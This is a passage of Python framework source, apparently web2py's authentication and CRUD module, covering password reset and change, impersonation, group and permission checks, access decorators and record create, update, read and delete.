IS_LOWER())\n        else:\n            table_user.username.requires = [\n                IS_IN_DB(self.db, table_user.username,\n                         error_message=self.messages.invalid_username)]\n            if not self.settings.username_case_sensitive:\n                table_user.username.requires.insert(0, IS_LOWER())\n\n        form = SQLFORM(table_user,\n                       fields=[userfield],\n                       hidden=dict(_next=next),\n                       showid=self.settings.showid,\n                       submit_button=self.messages.password_reset_button,\n                       delete_label=self.messages.delete_label,\n                       formstyle=self.settings.formstyle,\n                       separator=self.settings.label_separator\n                       )\n        if captcha:\n            addrow(form, captcha.label, captcha,\n                   captcha.comment, self.settings.formstyle, 'captcha__row')\n        if form.accepts(request, session if self.csrf_prevention else None,\n                        formname='reset_password', dbio=False,\n                        onvalidation=onvalidation,\n                        hideerror=self.settings.hideerror):\n            user = table_user(**{userfield:form.vars.get(userfield)})\n            if not user:\n                session.flash = self.messages['invalid_%s' % userfield]\n                redirect(self.url(args=request.args),\n                         client_side=self.settings.client_side)\n            elif user.registration_key in ('pending', 'disabled', 'blocked'):\n                session.flash = self.messages.registration_pending\n                redirect(self.url(args=request.args),\n                         client_side=self.settings.client_side)\n            if self.email_reset_password(user):\n                session.flash = self.messages.email_sent\n            else:\n                session.flash = self.messages.unable_to_send_email\n            self.log_event(log, user)\n            callback(onaccept, form)\n            if not next:\n                next = self.url(args=request.args)\n            else:\n                next = replace_id(next, form)\n            redirect(next, client_side=self.settings.client_side)\n        # old_requires = table_user.email.requires\n        return form\n\n    def email_reset_password(self, user):\n        reset_password_key = str(int(time.time())) + '-' + web2py_uuid()\n        link = self.url(self.settings.function,\n                        args=('reset_password',), vars={'key': reset_password_key},\n                        scheme=True)\n        d = dict(user)\n        d.update(dict(key=reset_password_key, link=link))\n        if self.settings.mailer and self.settings.mailer.send(\n            to=user.email,\n            subject=self.messages.reset_password_subject,\n            message=self.messages.reset_password % d):\n            user.update_record(reset_password_key=reset_password_key)\n            return True\n        return False\n\n    def retrieve_password(self,\n                          next=DEFAULT,\n                          onvalidation=DEFAULT,\n                          onaccept=DEFAULT,\n                          log=DEFAULT,\n                          ):\n        if self.settings.reset_password_requires_verification:\n            return self.request_reset_password(next, onvalidation, onaccept, log)\n        else:\n            return self.reset_password_deprecated(next, onvalidation, onaccept, log)\n\n    def change_password(self,\n                        next=DEFAULT,\n                        onvalidation=DEFAULT,\n                        onaccept=DEFAULT,\n                        log=DEFAULT,\n                        ):\n        \"\"\"\n        Returns a form that lets the user change password\n        \"\"\"\n\n        if not self.is_logged_in():\n            redirect(self.settings.login_url,\n                     client_side=self.settings.client_side)\n        db = self.db\n        table_user = self.table_user()\n        s = db(table_user.id == self.user.id)\n\n        request = current.request\n        session = current.session\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.change_password_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.change_password_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.change_password_onaccept\n        if log is DEFAULT:\n            log = self.messages['change_password_log']\n        passfield = self.settings.password_field\n        requires = table_user[passfield].requires\n        if not isinstance(requires, (list, tuple)):\n            requires = [requires]\n        requires = filter(lambda t: isinstance(t, CRYPT), requires)\n        if requires:\n            requires[0].min_length = 0\n        form = SQLFORM.factory(\n            Field('old_password', 'password', requires=requires,\n                label=self.messages.old_password),\n            Field('new_password', 'password',\n                label=self.messages.new_password,\n                requires=table_user[passfield].requires),\n            Field('new_password2', 'password',\n                label=self.messages.verify_password,\n                requires=[IS_EXPR(\n                    'value==%s' % repr(request.vars.new_password),\n                              self.messages.mismatched_password)]),\n            submit_button=self.messages.password_change_button,\n            hidden=dict(_next=next),\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator\n        )\n        if form.accepts(request, session,\n                        formname='change_password',\n                        onvalidation=onvalidation,\n                        hideerror=self.settings.hideerror):\n\n            current_user = s.select(limitby=(0, 1), orderby_on_limitby=False).first()\n            if not form.vars['old_password'] == current_user[passfield]:\n                form.errors['old_password'] = self.messages.invalid_password\n            else:\n                d = {passfield: str(form.vars.new_password)}\n                s.update(**d)\n                session.flash = self.messages.password_changed\n                self.log_event(log, self.user)\n                callback(onaccept, form)\n                if not next:\n                    next = self.url(args=request.args)\n                else:\n                    next = replace_id(next, form)\n                redirect(next, client_side=self.settings.client_side)\n        return form\n\n    def profile(self,\n                next=DEFAULT,\n                onvalidation=DEFAULT,\n                onaccept=DEFAULT,\n                log=DEFAULT,\n                ):\n        \"\"\"\n        Returns a form that lets the user change his/her profile\n        \"\"\"\n\n        table_user = self.table_user()\n        if not self.is_logged_in():\n            redirect(self.settings.login_url,\n                     client_side=self.settings.client_side)\n        passfield = self.settings.password_field\n        table_user[passfield].writable = False\n        request = current.request\n        session = current.session\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.profile_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.profile_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.profile_onaccept\n        if log is DEFAULT:\n            log = self.messages['profile_log']\n        form = SQLFORM(\n            table_user,\n            self.user.id,\n            fields=self.settings.profile_fields,\n            hidden=dict(_next=next),\n            showid=self.settings.showid,\n            submit_button=self.messages.profile_save_button,\n            delete_label=self.messages.delete_label,\n            upload=self.settings.download_url,\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator,\n            deletable=self.settings.allow_delete_accounts,\n            )\n        if form.accepts(request, session,\n                        formname='profile',\n                        onvalidation=onvalidation,\n                        hideerror=self.settings.hideerror):\n            self.user.update(table_user._filter_fields(form.vars))\n            session.flash = self.messages.profile_updated\n            self.log_event(log, self.user)\n            callback(onaccept, form)\n            if form.deleted:\n                return self.logout()\n            if not next:\n                next = self.url(args=request.args)\n            else:\n                next = replace_id(next, form)\n            redirect(next, client_side=self.settings.client_side)\n        return form\n\n    def run_login_onaccept(self):\n        onaccept = self.settings.login_onaccept\n        if onaccept:\n            form = Storage(dict(vars=self.user))\n            if not isinstance(onaccept, (list, tuple)):\n                onaccept = [onaccept]\n            for callback in onaccept:\n                callback(form)\n\n    def is_impersonating(self):\n        return self.is_logged_in() and 'impersonator' in current.session.auth\n\n    def impersonate(self, user_id=DEFAULT):\n        \"\"\"\n        To use this make a POST to\n        `http://..../impersonate request.post_vars.user_id=<id>`\n\n        Set request.post_vars.user_id to 0 to restore original user.\n\n        requires impersonator is logged in and::\n\n            has_permission('impersonate', 'auth_user', user_id)\n\n        \"\"\"\n        request = current.request\n        session = current.session\n        auth = session.auth\n        table_user = self.table_user()\n        if not self.is_logged_in():\n            raise HTTP(401, \"Not Authorized\")\n        current_id = auth.user.id\n        requested_id = user_id\n        if user_id is DEFAULT:\n            user_id = current.request.post_vars.user_id\n        if user_id and user_id != self.user.id and user_id != '0':\n            if not self.has_permission('impersonate',\n                                       self.table_user(),\n                                       user_id):\n                raise HTTP(403, \"Forbidden\")\n            user = table_user(user_id)\n            if not user:\n                raise HTTP(401, \"Not Authorized\")\n            auth.impersonator = pickle.dumps(session, pickle.HIGHEST_PROTOCOL)\n            auth.user.update(\n                table_user._filter_fields(user, True))\n            self.user = auth.user\n            self.update_groups()\n            log = self.messages['impersonate_log']\n            self.log_event(log, dict(id=current_id, other_id=auth.user.id))\n            self.run_login_onaccept()\n        elif user_id in (0, '0'):\n            if self.is_impersonating():\n                session.clear()\n                session.update(pickle.loads(auth.impersonator))\n                self.user = session.auth.user\n                self.update_groups()\n                self.run_login_onaccept()\n            return None\n        if requested_id is DEFAULT and not request.post_vars:\n            return SQLFORM.factory(Field('user_id', 'integer'))\n        return SQLFORM(table_user, user.id, readonly=True)\n\n    def update_groups(self):\n        if not self.user:\n            return\n        user_groups = self.user_groups = {}\n        if current.session.auth:\n            current.session.auth.user_groups = self.user_groups\n        table_group = self.table_group()\n        table_membership = self.table_membership()\n        memberships = self.db(\n            table_membership.user_id == self.user.id).select()\n        for membership in memberships:\n            group = table_group(membership.group_id)\n            if group:\n                user_groups[membership.group_id] = group.role\n\n    def groups(self):\n        \"\"\"\n        Displays the groups and their roles for the logged in user\n        \"\"\"\n\n        if not self.is_logged_in():\n            redirect(self.settings.login_url)\n        table_membership = self.table_membership()\n        memberships = self.db(\n            table_membership.user_id == self.user.id).select()\n        table = TABLE()\n        for membership in memberships:\n            table_group = self.table_group()\n            groups = self.db(table_group.id == membership.group_id).select()\n            if groups:\n                group = groups[0]\n                table.append(TR(H3(group.role, '(%s)' % group.id)))\n                table.append(TR(P(group.description)))\n        if not memberships:\n            return None\n        return table\n\n    def not_authorized(self):\n        \"\"\"\n        You can change the view for this page to make it look as you like\n        \"\"\"\n        if current.request.ajax:\n            raise HTTP(403, 'ACCESS DENIED')\n        return self.messages.access_denied\n\n    def requires(self, condition, requires_login=True, otherwise=None):\n        \"\"\"\n        Decorator that prevents access to action if not logged in\n        \"\"\"\n\n        def decorator(action):\n\n            def f(*a, **b):\n\n                basic_allowed, basic_accepted, user = self.basic()\n                user = user or self.user\n                if requires_login:\n                    if not user:\n                        if current.request.ajax:\n                            raise HTTP(401, self.messages.ajax_failed_authentication)\n                        elif not otherwise is None:\n                            if callable(otherwise):\n                                return otherwise()\n                            redirect(otherwise)\n                        elif self.settings.allow_basic_login_only or \\\n                                basic_accepted or current.request.is_restful:\n                            raise HTTP(403, \"Not authorized\")\n                        else:\n                            next = self.here()\n                            current.session.flash = current.response.flash\n                            return call_or_redirect(\n                                self.settings.on_failed_authentication,\n                                self.settings.login_url +\n                                    '?_next=' + urllib.quote(next))\n\n                if callable(condition):\n                    flag = condition()\n                else:\n                    flag = condition\n                if not flag:\n                    current.session.flash = self.messages.access_denied\n                    return call_or_redirect(\n                        self.settings.on_failed_authorization)\n                return action(*a, **b)\n            f.__doc__ = action.__doc__\n            f.__name__ = action.__name__\n            f.__dict__.update(action.__dict__)\n            return f\n\n        return decorator\n\n    def requires_login(self, otherwise=None):\n        \"\"\"\n        Decorator that prevents access to action if not logged in\n        \"\"\"\n        return self.requires(True, otherwise=otherwise)\n\n    def requires_login_or_token(self, otherwise=None):\n        if self.settings.enable_tokens == True:\n            user = None\n            request = current.request\n            token = request.env.http_web2py_user_token or request.vars._token\n            table_token = self.table_token()\n            table_user = self.table_user()\n            from gluon.settings import global_settings\n            if global_settings.web2py_runtime_gae:\n                row = table_token(token=token)\n                if row:\n                    user = table_user(row.user_id)\n            else:\n                row = self.db(table_token.token==token)(table_user.id==table_token.user_id).select().first()\n                if row:\n                    user = row[table_user._tablename]\n            if user:\n                self.login_user(user)\n        return self.requires(True, otherwise=otherwise)\n\n    def requires_membership(self, role=None, group_id=None, otherwise=None):\n        \"\"\"\n        Decorator that prevents access to action if not logged in or\n        if user logged in is not a member of group_id.\n        If role is provided instead of group_id then the\n        group_id is calculated.\n        \"\"\"\n        def has_membership(self=self, group_id=group_id, role=role):\n            return self.has_membership(group_id=group_id, role=role)\n        return self.requires(has_membership, otherwise=otherwise)\n\n    def requires_permission(self, name, table_name='', record_id=0,\n                            otherwise=None):\n        \"\"\"\n        Decorator that prevents access to action if not logged in or\n        if user logged in is not a member of any group (role) that\n        has 'name' access to 'table_name', 'record_id'.\n        \"\"\"\n        def has_permission(self=self, name=name, table_name=table_name, record_id=record_id):\n            return self.has_permission(name, table_name, record_id)\n        return self.requires(has_permission, otherwise=otherwise)\n\n    def requires_signature(self, otherwise=None, hash_vars=True):\n        \"\"\"\n        Decorator that prevents access to action if not logged in or\n        if user logged in is not a member of group_id.\n        If role is provided instead of group_id then the\n        group_id is calculated.\n        \"\"\"\n        def verify():\n            return URL.verify(current.request, user_signature=True, hash_vars=hash_vars)\n        return self.requires(verify, otherwise)\n\n    def add_group(self, role, description=''):\n        \"\"\"\n        Creates a group associated to a role\n        \"\"\"\n\n        group_id = self.table_group().insert(\n            role=role, description=description)\n        self.log_event(self.messages['add_group_log'],\n                       dict(group_id=group_id, role=role))\n        return group_id\n\n    def del_group(self, group_id):\n        \"\"\"\n        Deletes a group\n        \"\"\"\n        self.db(self.table_group().id == group_id).delete()\n        self.db(self.table_membership().group_id == group_id).delete()\n        self.db(self.table_permission().group_id == group_id).delete()\n        if group_id in self.user_groups: del self.user_groups[group_id]\n        self.log_event(self.messages.del_group_log, dict(group_id=group_id))\n\n    def id_group(self, role):\n        \"\"\"\n        Returns the group_id of the group specified by the role\n        \"\"\"\n        rows = self.db(self.table_group().role == role).select()\n        if not rows:\n            return None\n        return rows[0].id\n\n    def user_group(self, user_id=None):\n        \"\"\"\n        Returns the group_id of the group uniquely associated to this user\n        i.e. `role=user:[user_id]`\n        \"\"\"\n        return self.id_group(self.user_group_role(user_id))\n\n    def user_group_role(self, user_id=None):\n        if not self.settings.create_user_groups:\n            return None\n        if user_id:\n            user = self.table_user()[user_id]\n        else:\n            user = self.user\n        return self.settings.create_user_groups % user\n\n    def has_membership(self, group_id=None, user_id=None, role=None):\n        \"\"\"\n        Checks if user is member of group_id or role\n        \"\"\"\n\n        group_id = group_id or self.id_group(role)\n        try:\n            group_id = int(group_id)\n        except:\n            group_id = self.id_group(group_id)  # interpret group_id as a role\n        if not user_id and self.user:\n            user_id = self.user.id\n        membership = self.table_membership()\n        if group_id and user_id and self.db((membership.user_id == user_id)\n                    & (membership.group_id == group_id)).select():\n            r = True\n        else:\n            r = False\n        self.log_event(self.messages['has_membership_log'],\n                       dict(user_id=user_id, group_id=group_id, check=r))\n        return r\n\n    def add_membership(self, group_id=None, user_id=None, role=None):\n        \"\"\"\n        Gives user_id membership of group_id or role\n        if user is None than user_id is that of current logged in user\n        \"\"\"\n\n        group_id = group_id or self.id_group(role)\n        try:\n            group_id = int(group_id)\n        except:\n            group_id = self.id_group(group_id)  # interpret group_id as a role\n        if not user_id and self.user:\n            user_id = self.user.id\n        membership = self.table_membership()\n        record = membership(user_id=user_id, group_id=group_id)\n        if record:\n            return record.id\n        else:\n            id = membership.insert(group_id=group_id, user_id=user_id)\n        if role:\n            self.user_groups[group_id] = role\n        else:\n            self.update_groups()\n        self.log_event(self.messages['add_membership_log'],\n                       dict(user_id=user_id, group_id=group_id))\n        return id\n\n    def del_membership(self, group_id=None, user_id=None, role=None):\n        \"\"\"\n        Revokes membership from group_id to user_id\n        if user_id is None than user_id is that of current logged in user\n        \"\"\"\n\n        group_id = group_id or self.id_group(role)\n        if not user_id and self.user:\n            user_id = self.user.id\n        membership = self.table_membership()\n        self.log_event(self.messages['del_membership_log'],\n                       dict(user_id=user_id, group_id=group_id))\n        ret = self.db(membership.user_id\n                      == user_id)(membership.group_id\n                                  == group_id).delete()\n        if group_id in self.user_groups: del self.user_groups[group_id]\n        return ret\n\n    def has_permission(self,\n                       name='any',\n                       table_name='',\n                       record_id=0,\n                       user_id=None,\n                       group_id=None,\n                       ):\n        \"\"\"\n        Checks if user_id or current logged in user is member of a group\n        that has 'name' permission on 'table_name' and 'record_id'\n        if group_id is passed, it checks whether the group has the permission\n        \"\"\"\n\n        if not group_id and self.settings.everybody_group_id and \\\n                self.has_permission(\n            name, table_name, record_id, user_id=None,\n            group_id=self.settings.everybody_group_id):\n                return True\n\n        if not user_id and not group_id and self.user:\n            user_id = self.user.id\n        if user_id:\n            membership = self.table_membership()\n            rows = self.db(membership.user_id\n                           == user_id).select(membership.group_id)\n            groups = set([row.group_id for row in rows])\n            if group_id and not group_id in groups:\n                return False\n        else:\n            groups = set([group_id])\n        permission = self.table_permission()\n        rows = self.db(permission.name == name)(permission.table_name\n                 == str(table_name))(permission.record_id\n                 == record_id).select(permission.group_id)\n        groups_required = set([row.group_id for row in rows])\n        if record_id:\n            rows = self.db(permission.name\n                            == name)(permission.table_name\n                     == str(table_name))(permission.record_id\n                     == 0).select(permission.group_id)\n            groups_required = groups_required.union(set([row.group_id\n                    for row in rows]))\n        if groups.intersection(groups_required):\n            r = True\n        else:\n            r = False\n        if user_id:\n            self.log_event(self.messages['has_permission_log'],\n                           dict(user_id=user_id, name=name,\n                                table_name=table_name, record_id=record_id))\n        return r\n\n    def add_permission(self,\n                       group_id,\n                       name='any',\n                       table_name='',\n                       record_id=0,\n                       ):\n        \"\"\"\n        Gives group_id 'name' access to 'table_name' and 'record_id'\n        \"\"\"\n\n        permission = self.table_permission()\n        if group_id == 0:\n            group_id = self.user_group()\n        record = self.db(permission.group_id == group_id)(permission.name == name)(permission.table_name == str(table_name))(\n                permission.record_id == long(record_id)).select(limitby=(0, 1), orderby_on_limitby=False).first()\n        if record:\n            id = record.id\n        else:\n            id = permission.insert(group_id=group_id, name=name,\n                                   table_name=str(table_name),\n                                   record_id=long(record_id))\n        self.log_event(self.messages['add_permission_log'],\n                       dict(permission_id=id, group_id=group_id,\n                            name=name, table_name=table_name,\n                            record_id=record_id))\n        return id\n\n    def del_permission(self,\n                       group_id,\n                       name='any',\n                       table_name='',\n                       record_id=0,\n                       ):\n        \"\"\"\n        Revokes group_id 'name' access to 'table_name' and 'record_id'\n        \"\"\"\n\n        permission = self.table_permission()\n        self.log_event(self.messages['del_permission_log'],\n                       dict(group_id=group_id, name=name,\n                            table_name=table_name, record_id=record_id))\n        return self.db(permission.group_id == group_id)(permission.name\n                 == name)(permission.table_name\n                           == str(table_name))(permission.record_id\n                 == long(record_id)).delete()\n\n    def accessible_query(self, name, table, user_id=None):\n        \"\"\"\n        Returns a query with all accessible records for user_id or\n        the current logged in user\n        this method does not work on GAE because uses JOIN and IN\n\n        Example:\n            Use as::\n\n                db(auth.accessible_query('read', db.mytable)).select(db.mytable.ALL)\n\n        \"\"\"\n        if not user_id:\n            user_id = self.user_id\n        db = self.db\n        if isinstance(table, str) and table in self.db.tables():\n            table = self.db[table]\n        elif isinstance(table, (Set, Query)):\n            # experimental: build a chained query for all tables\n            if isinstance(table, Set):\n                cquery = table.query\n            else:\n                cquery = table\n            tablenames = db._adapter.tables(cquery)\n            for tablename in tablenames:\n                cquery &= self.accessible_query(name, tablename,\n                                                user_id=user_id)\n            return cquery\n        if not isinstance(table, str) and\\\n                self.has_permission(name, table, 0, user_id):\n            return table.id > 0\n        membership = self.table_membership()\n        permission = self.table_permission()\n        query = table.id.belongs(\n            db(membership.user_id == user_id)\n                (membership.group_id == permission.group_id)\n                (permission.name == name)\n                (permission.table_name == table)\n                ._select(permission.record_id))\n        if self.settings.everybody_group_id:\n            query |= table.id.belongs(\n                db(permission.group_id == self.settings.everybody_group_id)\n                    (permission.name == name)\n                    (permission.table_name == table)\n                    ._select(permission.record_id))\n        return query\n\n    @staticmethod\n    def archive(form,\n                archive_table=None,\n                current_record='current_record',\n                archive_current=False,\n                fields=None):\n        \"\"\"\n        If you have a table (db.mytable) that needs full revision history you\n        can just do::\n\n            form=crud.update(db.mytable,myrecord,onaccept=auth.archive)\n\n        or::\n\n            form=SQLFORM(db.mytable,myrecord).process(onaccept=auth.archive)\n\n        crud.archive will define a new table \"mytable_archive\" and store\n        a copy of the current record (if archive_current=True)\n        or a copy of the previous record (if archive_current=False)\n        in the newly created table including a reference\n        to the current record.\n\n        fields allows to specify extra fields that need to be archived.\n\n        If you want to access such table you need to define it yourself\n        in a model::\n\n            db.define_table('mytable_archive',\n                Field('current_record',db.mytable),\n                db.mytable)\n\n        Notice such table includes all fields of db.mytable plus one: current_record.\n        crud.archive does not timestamp the stored record unless your original table\n        has a fields like::\n\n            db.define_table(...,\n                Field('saved_on','datetime',\n                     default=request.now,update=request.now,writable=False),\n                Field('saved_by',auth.user,\n                     default=auth.user_id,update=auth.user_id,writable=False),\n\n        there is nothing special about these fields since they are filled before\n        the record is archived.\n\n        If you want to change the archive table name and the name of the reference field\n        you can do, for example::\n\n            db.define_table('myhistory',\n                Field('parent_record',db.mytable),\n                db.mytable)\n\n        and use it as::\n\n            form=crud.update(db.mytable,myrecord,\n                             onaccept=lambda form:crud.archive(form,\n                             archive_table=db.myhistory,\n                             current_record='parent_record'))\n\n        \"\"\"\n        if not archive_current and not form.record:\n            return None\n        table = form.table\n        if not archive_table:\n            archive_table_name = '%s_archive' % table\n            if not archive_table_name in table._db:\n                table._db.define_table(\n                    archive_table_name,\n                    Field(current_record, table),\n                    *[field.clone(unique=False) for field in table])\n            archive_table = table._db[archive_table_name]\n        new_record = {current_record: form.vars.id}\n        for fieldname in archive_table.fields:\n            if not fieldname in ['id', current_record]:\n                if archive_current and fieldname in form.vars:\n                    new_record[fieldname] = form.vars[fieldname]\n                elif form.record and fieldname in form.record:\n                    new_record[fieldname] = form.record[fieldname]\n        if fields:\n            new_record.update(fields)\n        id = archive_table.insert(**new_record)\n        return id\n\n    def wiki(self,\n             slug=None,\n             env=None,\n             render='markmin',\n             manage_permissions=False,\n             force_prefix='',\n             restrict_search=False,\n             resolve=True,\n             extra=None,\n             menu_groups=None,\n             templates=None,\n             migrate=True,\n             controller=None,\n             function=None,\n             force_render=False,\n             groups=None):\n\n        if controller and function:\n            resolve = False\n\n        if not hasattr(self, '_wiki'):\n            self._wiki = Wiki(self, render=render,\n                              manage_permissions=manage_permissions,\n                              force_prefix=force_prefix,\n                              restrict_search=restrict_search,\n                              env=env, extra=extra or {},\n                              menu_groups=menu_groups,\n                              templates=templates,\n                              migrate=migrate,\n                              controller=controller,\n                              function=function,\n                              groups=groups)\n        else:\n            self._wiki.env.update(env or {})\n\n        # if resolve is set to True, process request as wiki call\n        # resolve=False allows initial setup without wiki redirection\n        wiki = None\n        if resolve:\n            if slug:\n                wiki = self._wiki.read(slug, force_render)\n                if isinstance(wiki, dict) and wiki.has_key('content'):  # FIXME: .has_key() is deprecated\n                    # We don't want to return a dict object, just the wiki\n                    wiki = wiki['content']\n            else:\n                wiki = self._wiki()\n            if isinstance(wiki, basestring):\n                wiki = XML(wiki)\n            return wiki\n\n    def wikimenu(self):\n        \"\"\"To be used in menu.py for app wide wiki menus\"\"\"\n        if (hasattr(self, \"_wiki\") and\n            self._wiki.settings.controller and\n            self._wiki.settings.function):\n            self._wiki.automenu()\n\n\nclass Crud(object):\n\n    def url(self, f=None, args=None, vars=None):\n        \"\"\"\n        This should point to the controller that exposes\n        download and crud\n        \"\"\"\n        if args is None:\n            args = []\n        if vars is None:\n            vars = {}\n        return URL(c=self.settings.controller, f=f, args=args, vars=vars)\n\n    def __init__(self, environment, db=None, controller='default'):\n        self.db = db\n        if not db and environment and isinstance(environment, DAL):\n            self.db = environment\n        elif not db:\n            raise SyntaxError(\"must pass db as first or second argument\")\n        self.environment = current\n        settings = self.settings = Settings()\n        settings.auth = None\n        settings.logger = None\n\n        settings.create_next = None\n        settings.update_next = None\n        settings.controller = controller\n        settings.delete_next = self.url()\n        settings.download_url = self.url('download')\n        settings.create_onvalidation = StorageList()\n        settings.update_onvalidation = StorageList()\n        settings.delete_onvalidation = StorageList()\n        settings.create_onaccept = StorageList()\n        settings.update_onaccept = StorageList()\n        settings.update_ondelete = StorageList()\n        settings.delete_onaccept = StorageList()\n        settings.update_deletable = True\n        settings.showid = False\n        settings.keepvalues = False\n        settings.create_captcha = None\n        settings.update_captcha = None\n        settings.captcha = None\n        settings.formstyle = 'table3cols'\n        settings.label_separator = ': '\n        settings.hideerror = False\n        settings.detect_record_change = True\n        settings.hmac_key = None\n        settings.lock_keys = True\n\n        messages = self.messages = Messages(current.T)\n        messages.submit_button = 'Submit'\n        messages.delete_label = 'Check to delete'\n        messages.record_created = 'Record Created'\n        messages.record_updated = 'Record Updated'\n        messages.record_deleted = 'Record Deleted'\n\n        messages.update_log = 'Record %(id)s updated'\n        messages.create_log = 'Record %(id)s created'\n        messages.read_log = 'Record %(id)s read'\n        messages.delete_log = 'Record %(id)s deleted'\n\n        messages.lock_keys = True\n\n    def __call__(self):\n        args = current.request.args\n        if len(args) < 1:\n            raise HTTP(404)\n        elif args[0] == 'tables':\n            return self.tables()\n        elif len(args) > 1 and not args(1) in self.db.tables:\n            raise HTTP(404)\n        table = self.db[args(1)]\n        if args[0] == 'create':\n            return self.create(table)\n        elif args[0] == 'select':\n            return self.select(table, linkto=self.url(args='read'))\n        elif args[0] == 'search':\n            form, rows = self.search(table, linkto=self.url(args='read'))\n            return DIV(form, SQLTABLE(rows))\n        elif args[0] == 'read':\n            return self.read(table, args(2))\n        elif args[0] == 'update':\n            return self.update(table, args(2))\n        elif args[0] == 'delete':\n            return self.delete(table, args(2))\n        else:\n            raise HTTP(404)\n\n    def log_event(self, message, vars):\n        if self.settings.logger:\n            self.settings.logger.log_event(message, vars, origin='crud')\n\n    def has_permission(self, name, table, record=0):\n        if not self.settings.auth:\n            return True\n        try:\n            record_id = record.id\n        except:\n            record_id = record\n        return self.settings.auth.has_permission(name, str(table), record_id)\n\n    def tables(self):\n        return TABLE(*[TR(A(name,\n                            _href=self.url(args=('select', name))))\n                       for name in self.db.tables])\n\n    @staticmethod\n    def archive(form, archive_table=None, current_record='current_record'):\n        return Auth.archive(form, archive_table=archive_table,\n                            current_record=current_record)\n\n    def update(self,\n               table,\n               record,\n               next=DEFAULT,\n               onvalidation=DEFAULT,\n               onaccept=DEFAULT,\n               ondelete=DEFAULT,\n               log=DEFAULT,\n               message=DEFAULT,\n               deletable=DEFAULT,\n               formname=DEFAULT,\n               **attributes\n               ):\n        if not (isinstance(table, Table) or table in self.db.tables) \\\n                or (isinstance(record, str) and not str(record).isdigit()):\n            raise HTTP(404)\n        if not isinstance(table, Table):\n            table = self.db[table]\n        try:\n            record_id = record.id\n        except:\n            record_id = record or 0\n        if record_id and not self.has_permission('update', table, record_id):\n            redirect(self.settings.auth.settings.on_failed_authorization)\n        if not record_id and not self.has_permission('create', table, record_id):\n            redirect(self.settings.auth.settings.on_failed_authorization)\n\n        request = current.request\n        response = current.response\n        session = current.session\n        if request.extension == 'json' and request.vars.json:\n            request.vars.update(json_parser.loads(request.vars.json))\n        if next is DEFAULT:\n            next = request.get_vars._next \\\n                or request.post_vars._next \\\n                or self.settings.update_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.update_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.update_onaccept\n        if ondelete is DEFAULT:\n            ondelete = self.settings.update_ondelete\n        if log is DEFAULT:\n            log = self.messages['update_log']\n        if deletable is DEFAULT:\n            deletable = self.settings.update_deletable\n        if message is DEFAULT:\n            message = self.messages.record_updated\n        if not 'hidden' in attributes:\n            attributes['hidden'] = {}\n        attributes['hidden']['_next'] = next\n        form = SQLFORM(\n            table,\n            record,\n            showid=self.settings.showid,\n            submit_button=self.messages.submit_button,\n            delete_label=self.messages.delete_label,\n            deletable=deletable,\n            upload=self.settings.download_url,\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator,\n            **attributes  # contains hidden\n            )\n        self.accepted = False\n        self.deleted = False\n        captcha = self.settings.update_captcha or self.settings.captcha\n        if record and captcha:\n            addrow(form, captcha.label, captcha, captcha.comment,\n                         self.settings.formstyle, 'captcha__row')\n        captcha = self.settings.create_captcha or self.settings.captcha\n        if not record and captcha:\n            addrow(form, captcha.label, captcha, captcha.comment,\n                         self.settings.formstyle, 'captcha__row')\n        if not request.extension in ('html', 'load'):\n            (_session, _formname) = (None, None)\n        else:\n            (_session, _formname) = (\n                session, '%s/%s' % (table._tablename, form.record_id))\n        if not formname is DEFAULT:\n            _formname = formname\n        keepvalues = self.settings.keepvalues\n        if request.vars.delete_this_record:\n            keepvalues = False\n        if isinstance(onvalidation, StorageList):\n            onvalidation = onvalidation.get(table._tablename, [])\n        if form.accepts(request, _session, formname=_formname,\n                        onvalidation=onvalidation, keepvalues=keepvalues,\n                        hideerror=self.settings.hideerror,\n                        detect_record_change=self.settings.detect_record_change):\n            self.accepted = True\n            response.flash = message\n            if log:\n                self.log_event(log, form.vars)\n            if request.vars.delete_this_record:\n                self.deleted = True\n                message = self.messages.record_deleted\n                callback(ondelete, form, table._tablename)\n            response.flash = message\n            callback(onaccept, form, table._tablename)\n            if not request.extension in ('html', 'load'):\n                raise HTTP(200, 'RECORD CREATED/UPDATED')\n            if isinstance(next, (list, tuple)):  # fix issue with 2.6\n                next = next[0]\n            if next:  # Only redirect when explicit\n                next = replace_id(next, form)\n                session.flash = response.flash\n                redirect(next)\n        elif not request.extension in ('html', 'load'):\n            raise HTTP(401, serializers.json(dict(errors=form.errors)))\n        return form\n\n    def create(self,\n               table,\n               next=DEFAULT,\n               onvalidation=DEFAULT,\n               onaccept=DEFAULT,\n               log=DEFAULT,\n               message=DEFAULT,\n               formname=DEFAULT,\n               **attributes\n               ):\n\n        if next is DEFAULT:\n            next = self.settings.create_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.create_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.create_onaccept\n        if log is DEFAULT:\n            log = self.messages['create_log']\n        if message is DEFAULT:\n            message = self.messages.record_created\n        return self.update(\n            table,\n            None,\n            next=next,\n            onvalidation=onvalidation,\n            onaccept=onaccept,\n            log=log,\n            message=message,\n            deletable=False,\n            formname=formname,\n            **attributes\n            )\n\n    def read(self, table, record):\n        if not (isinstance(table, Table) or table in self.db.tables) \\\n                or (isinstance(record, str) and not str(record).isdigit()):\n            raise HTTP(404)\n        if not isinstance(table, Table):\n            table = self.db[table]\n        if not self.has_permission('read', table, record):\n            redirect(self.settings.auth.settings.on_failed_authorization)\n        form = SQLFORM(\n            table,\n            record,\n            readonly=True,\n            comments=False,\n            upload=self.settings.download_url,\n            showid=self.settings.showid,\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator\n            )\n        if not current.request.extension in ('html', 'load'):\n            return table._filter_fields(form.record, id=True)\n        return form\n\n    def delete(self,\n               table,\n               record_id,\n               next=DEFAULT,\n               message=DEFAULT,\n               ):\n        if not (isinstance(table, Table) or table in self.db.tables):\n            raise HTTP(404)\n        if not isinstance(table, Table):\n            table = self.db[table]\n        if not self.has_permission('delete', table, record_id):\n            redirect(self.settings.auth.settings.on_failed_authorization)\n        request = current.request\n        